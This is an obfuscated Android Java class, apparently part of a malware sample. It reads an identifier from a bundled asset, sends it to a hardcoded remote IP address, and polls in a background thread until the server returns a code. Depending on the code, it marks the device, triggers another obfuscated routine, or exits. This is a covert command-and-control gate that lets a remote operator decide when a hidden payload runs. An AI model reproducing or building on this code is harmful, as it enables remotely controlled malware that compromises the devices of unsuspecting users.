import android.content.Context;
import android.os.SystemClock;
import java.io.File;
import java.io.InputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class start {
    public static void a(final Context context) {
        Runnable r1 = new Runnable() {
            public void run() {
                try {
                    File f1 = new File(context.getFilesDir() + "/ffdtr.dat");
                    if (!f1.exists()) {
                        String s1 = "";
                        try {
                            InputStream is1 = context.getAssets().open("ccwc.txt");
                            int i1 = is1.available();
                            byte[] b1 = new byte[i1];
                            is1.read(b1);
                            is1.close();
                            s1 = new String(b1);
                        } catch (Exception e1) {
                            System.exit(0);
                        }
                        while (true) {
                            HttpURLConnection huc1 = null;
                            try {
                                huc1 = (HttpURLConnection) new URL("http://185.154.14.51/start/" + s1).openConnection();
                                huc1.connect();
                                StringBuilder sb1 = new StringBuilder();
                                BufferedReader br1 = new BufferedReader(new InputStreamReader(huc1.getInputStream()));
                                String s2;
                                while ((s2 = br1.readLine()) != null) {
                                    sb1.append(s2);
                                } if (sb1.toString().equals("1125")) {
                                    f1.createNewFile();
                                    break;
                                } if (sb1.toString().equals("1126")) {
                                    mlp.c(context);
                                    break;
                                } if (sb1.toString().equals("1127")) {
                                    System.exit(0);
                                }
                            } catch (Exception e2) {
                                SystemClock.sleep(1000);
                            } finally {
                                if (huc1 != null) {
                                    huc1.disconnect();
                                }
                            }
                        }
                    }
                } catch (Throwable th1) {
                    th1.printStackTrace();
                }
            }
        };

        Thread t1 = new Thread(r1);
        t1.start();
    }
}
